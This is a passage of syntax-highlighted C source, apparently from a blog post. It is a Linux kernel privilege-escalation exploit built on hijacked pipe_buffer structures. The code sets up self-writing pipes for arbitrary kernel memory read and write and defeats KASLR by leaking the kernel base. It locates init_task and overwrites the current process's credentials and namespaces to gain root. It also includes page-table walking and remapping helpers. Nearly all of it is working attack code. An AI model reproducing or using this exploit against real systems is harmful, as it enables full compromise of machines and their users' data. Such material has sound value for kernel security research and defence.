&lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x1000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x070</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x070</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), buf);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-57</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-56</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-57</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-50</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-50</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,<br>                   (<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief find the init_task and copy something to current task_struct</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) ptask_page_addr, buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (ptask_page_addr+<span class="hljs-number">0x40</span>),&amp;buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">363</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">377</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">363</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">364</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">377</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>),<br>                            &amp;buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    get_root_shell();<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_OFFSET 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_OFFSET 21</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_OFFSET 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_OFFSET 39</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span><br><br><span class="hljs-type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;<br><span class="hljs-type">size_t</span> stack_addr, stack_addr_another;<br><span class="hljs-type">size_t</span> stack_page, mm_struct_page;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br><br>    <span class="hljs-keyword">return</span> pte_val;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">vaddr_resolve_for_3_level</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    <span class="hljs-keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vaddr_remapping</span><span class="hljs-params">(<span class="hljs-type">size_t</span> pgd_addr, <span class="hljs-type">size_t</span> vaddr, <span class="hljs-type">size_t</span> paddr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> pud_addr, pmd_addr, pte_addr;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);<br>    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pud_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);<br>    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pmd_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);<br>    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="hljs-number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);<br>    pte_addr += page_offset_base;<br><br>    arbitrary_read_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);<br>    buf[PTE_ENTRY(vaddr)] = paddr | <span class="hljs-number">0x8000000000000867</span>; <span class="hljs-comment">/* mark it writable */</span><br>    arbitrary_write_by_pipe((<span class="hljs-type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,<br>                            <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pgd_vaddr_resolve</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading current task_struct...&quot;</span>);<br><br>    <span class="hljs-comment">/* read current task_struct */</span><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) current_task_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (current_task_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    stack_addr = tsk_buf[<span class="hljs-number">4</span>];<br>    mm_struct_addr = tsk_buf[<span class="hljs-number">292</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);<br><br>    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);<br><br>    <span class="hljs-comment">/* read mm_struct */</span><br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) mm_struct_page, buf);<br>    arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (mm_struct_page+<span class="hljs-number">0x40</span>), &amp;buf[<span class="hljs-number">512</span>]);<br><br>    mm_struct_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) buf + (mm_struct_addr &amp; <span class="hljs-number">0xfff</span>));<br><br>    <span class="hljs-comment">/* only this is a virtual addr, others in page table are all physical addr*/</span><br>    pgd_addr = mm_struct_buf[<span class="hljs-number">9</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span><br><span class="hljs-comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span><br><span class="hljs-comment"> * But what I want is a more novel and general exploitation that </span><br><span class="hljs-comment"> * doesn&#x27;t need any information about the kernel image. </span><br><span 